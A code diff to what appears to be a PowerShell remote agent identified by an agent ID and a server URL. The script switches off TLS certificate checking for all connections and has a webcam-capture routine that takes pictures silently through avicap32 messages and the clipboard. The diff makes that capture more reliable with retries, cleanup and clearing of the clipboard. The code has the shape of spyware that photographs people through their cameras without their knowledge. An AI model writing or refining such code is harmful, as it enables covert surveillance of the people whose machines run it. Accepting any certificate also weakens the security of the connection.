@@ -3,6 +3,7 @@ param(
     [string]$AgentID = "PC-01"
 )
 
+$ServerURL = $ServerURL.TrimEnd('/')
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 
@@ -52,13 +53,21 @@ Function Capture-Webcam {
             SendMessage(hWnd, 0x0400 + 41, 0, 0); // WM_CAP_EDIT_COPY
             
             bool success = false;
-            try {
-                Image img = System.Windows.Forms.Clipboard.GetImage();
-                if (img != null) {
-                    img.Save(filePath, ImageFormat.Jpeg);
-                    success = true;
-                }
-            } catch { success = false; }
+            for (int r = 0; r < 5; r++) {
+                try {
+                    if (System.Windows.Forms.Clipboard.ContainsImage()) {
+                        Image img = System.Windows.Forms.Clipboard.GetImage();
+                        if (img != null) {
+                            img.Save(filePath, ImageFormat.Jpeg);
+                            img.Dispose();
+                            success = true;
+                            break;
+                        }
+                    }
+                } catch { }
+                System.Threading.Thread.Sleep(200);
+            }
+            try { System.Windows.Forms.Clipboard.Clear(); } catch { }
 
             SendMessage(hWnd, 0x0400 + 11, 0, 0); // WM_CAP_DRIVER_DISCONNECT
             DestroyWindow(hWnd);
